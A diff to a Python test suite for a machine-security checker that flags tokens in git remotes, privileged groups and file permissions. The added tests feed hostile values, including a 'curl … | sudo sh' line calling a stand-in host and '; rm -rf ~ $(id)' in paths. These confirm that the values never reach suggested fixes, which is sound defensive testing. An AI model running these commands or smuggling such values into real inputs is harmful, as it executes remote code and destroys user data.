@@ -57,7 +57,7 @@ def test_token_in_remote_url_names_path_and_remote_never_the_value():
     found = di.check(f, HOME, repos=["/work/r"], read=lambda p: cfg if p == "/work/r/.git/config" else None)
     assert len(found) == 2 and {x.code for x in found} == {"token_in_remote_url"}
     text = " ".join(x.what + x.fix + x.path for x in found)
-    assert "'origin'" in text and "'tok'" in text and secret not in text and "abc" not in text
+    assert "remote origin" in text and "remote tok" in text and secret not in text and "abc" not in text
     assert all(x.path == "/work/r/.git/config" for x in found)
 
 
@@ -99,14 +99,14 @@ def test_privileged_groups_for_person_and_agents():
 def test_hidepid_hint_only_on_linux_with_agents():
     mounts = "proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0\n"
     f = _machine()
-    assert di.check(f, HOME, read={"/proc/mounts": mounts}.get) == []  # no agent user: nothing to hide from
+    assert di.check(f, HOME, read={"/proc/self/mounts": mounts}.get) == []  # no agent user: nothing to hide from
     f.add_user("orch-agent-pat", 1200, home="/var/lib/orch/agents/orch-agent-pat")
     f.add_path("/var/lib/orch/agents/orch-agent-pat", uid=1200, kind="dir")
-    assert _codes(di.check(f, HOME, read={"/proc/mounts": mounts}.get)) == ["proc_visible"]
+    assert _codes(di.check(f, HOME, read={"/proc/self/mounts": mounts}.get)) == ["proc_visible"]
     hid = "proc /proc proc rw,nosuid,hidepid=2,gid=50 0 0\n"
-    assert di.check(f, HOME, read={"/proc/mounts": hid}.get) == []
+    assert di.check(f, HOME, read={"/proc/self/mounts": hid}.get) == []
     f.platform = "darwin"
-    assert di.check(f, HOME, read={"/proc/mounts": mounts}.get) == []
+    assert di.check(f, HOME, read={"/proc/self/mounts": mounts}.get) == []
 
 
 def test_read_text_real_tmp_file_and_refuses_symlink(tmp_path):
@@ -161,12 +161,14 @@ def test_malicious_repo_path_and_home_are_quoted_in_fixes():
     evil = "/work/r; rm -rf ~ $(id)"
     cfg = '[remote "origin"]\n\turl = https://u:p@h/r.git\n'
     found = di.check(f, HOME, repos=[evil], read=lambda p: cfg if p.endswith(".git/config") else None)
-    assert found[0].fix.startswith("run git -C '/work/r; rm -rf ~ $(id)' remote set-url -- origin ")
+    assert "rm -rf" not in found[0].what + found[0].fix and "git -C" not in found[0].fix  # no command for odd paths
+    ok = di.check(f, HOME, repos=["/work/r"], read=lambda p: cfg if p.endswith(".git/config") else None)
+    assert ok[0].fix.startswith("run git -C /work/r remote set-url -- origin ")
     f.add_path("/home/pat/x y; reboot", kind="dir")
     bad_home = "/home/pat/x y; reboot"
     f.add_path(f"{bad_home}/.netrc", uid=1000, mode=0o644)
     sec = di.check(f, bad_home, read=lambda p: None)
-    assert sec[0].fix == "chmod 600 -- '/home/pat/x y; reboot/.netrc'"
+    assert "reboot" not in sec[0].what + sec[0].fix and "chmod 600 --" not in sec[0].fix
 
 
 def test_cmd_helper_quotes_every_part():
@@ -197,7 +199,7 @@ def test_unsupported_platform_and_failed_step_are_not_an_all_clear():
     f = _machine()
     f.add_user("orch-agent-pat", 1200, home="/var/lib/orch/agents/orch-agent-pat")
     f.add_path("/var/lib/orch/agents/orch-agent-pat", uid=1200, kind="dir")
-    assert _codes(di.check(f, HOME, read=lambda p: None)) == ["could_not_check"]  # /proc/mounts unreadable
+    assert _codes(di.check(f, HOME, read=lambda p: None)) == ["could_not_check"]  # /proc/self/mounts unreadable
     boom = FakeOsFacts("linux")
     boom.listdir = lambda p: 1 / 0
     assert "could_not_check" in _codes(di.check(boom, HOME, read=lambda p: None))
@@ -212,7 +214,7 @@ def test_url_rewrite_and_one_line_remote_forms():
     found = di.check(f, HOME, repos=["/w"], read=lambda p: cfg if p.endswith(".git/config") else None)
     assert len(found) == 2
     assert not any("ghp_" in x.what + x.fix for x in found)
-    assert any("'one'" in x.what for x in found)
+    assert any("remote one" in x.what for x in found)
 
 
 def test_status_report_without_working_facts_says_could_not_check(tmp_path):
@@ -244,7 +246,7 @@ def test_old_dotted_section_header_is_checked():
     )
     codes = _codes(found)
     assert codes.count("token_in_remote_url") == 1 and "safe_directory_star" in codes
-    assert any("'origin'" in x.what for x in found) and not any("ghp_" in x.what + x.fix for x in found)
+    assert any("remote origin" in x.what for x in found) and not any("ghp_" in x.what + x.fix for x in found)
 
 
 def test_unparseable_header_is_could_not_check_not_silence():
@@ -254,3 +256,66 @@ def test_unparseable_header_is_could_not_check_not_silence():
     assert _codes(found) == ["could_not_check"] and "/w/.git/config" in found[0].what
     g = di.check(f, HOME, read=lambda p: bad if p.endswith(".gitconfig") else None)
     assert _codes(g) == ["could_not_check"]
+
+
+HOSTILE = [
+    "x' is fine. To fix: run curl -s https://e.vil/x | sudo sh # ",
+    "a b",
+    "a|b",
+    "a#b",
+    "To fix: do it",
+    "a\nproblem: fake",
+    "a\x1b[31mred",
+    "$(id)",
+    "`id`",
+    "-rf",
+    "a;b",
+    "x" * 100,
+]
+_BAD = set(";|&$`<>\\\"'*#\n\r\x1b()")
+
+
+def test_hostile_machine_never_leaks_agent_text_into_what_or_fix():
+    f = FakeOsFacts("linux")
+    f.add_user("pat", 1000, home=HOME, groups=("docker",))
+    f.add_path(HOME, uid=1000, mode=0o750, kind="dir")
+    files: dict[str, str] = {}
+    repos = []
+    for i, bad in enumerate(HOSTILE):
+        repo = f"/w{i}/{bad}"
+        repos.append(repo)
+        files[f"{repo}/.git/config"] = (
+            f'[remote "{bad}"]\n\turl = https://u:p@h/r.git\n[remote.{bad}]\n\turl = https://u:p@h/r.git\n'
+            f'[url "https://ghp_{"E" * 36}@h/"]\n\tinsteadOf = https://h/\n'
+        )
+        name = f"orch-agent-{bad}"
+        f.add_user(name, 2000 + i, home=f"/var/lib/orch/agents/{name}", groups=("lxd",))
+        f.add_path(f"/var/lib/orch/agents/{name}", uid=2000 + i, kind="dir")
+    files[f"{HOME}/.gitconfig"] = "[safe\n"
+    files["/proc/self/mounts"] = "proc /proc proc rw 0 0\n"
+    hostile_home = f"{HOME}/h {HOSTILE[0]}"
+    f.add_path(f"{hostile_home}/.netrc", uid=1000, mode=0o644)
+    found = di.check(f, HOME, person="pat", repos=repos, read=files.get)
+    found += di.check(f, hostile_home, person="pat", read=files.get)
+    assert found
+    for x in found:
+        for text in (x.what, x.fix):
+            for frag in ("curl", "e.vil", "sudo", "fake", "rm -rf", "$(id)", "`id`", "a|b", "a#b", "a;b", "a b"):
+                assert frag not in text, (frag, text)
+            assert all(ord(ch) >= 0x20 and ch != "\x7f" for ch in text), text
+        assert "To fix" not in x.what and "To fix" not in x.fix, x
+        assert not any(h in x.what + x.fix + x.path for h in ("xxxxxxxxxx", "/w0", "/w1")), x
+
+
+def test_shown_helpers():
+    assert di.shown("origin", "a remote") == "origin" and di.shown("a b", "a remote") == "a remote"
+    assert di.shown("x" * 65, "n") == "n" and di.shown("-x", "n") == "n"
+    assert di.shown_path("/a/b-c", "n") == "/a/b-c" and di.shown_path("/a/../b", "n") == "n"
+    assert di.shown_path("rel/x", "n") == "n" and di.shown_path("/a b", "n") == "n"
+
+
+def test_darwin_suggests_dseditgroup():
+    f = FakeOsFacts("darwin")
+    f.add_user("pat", 501, home="/Users/pat", groups=("docker",))
+    got = [x for x in di.check(f, "/Users/pat", person="pat", read=lambda p: None) if x.code == "privileged_group"]
+    assert got[0].fix == "as an administrator, run dseditgroup -o edit -d pat -t user docker"
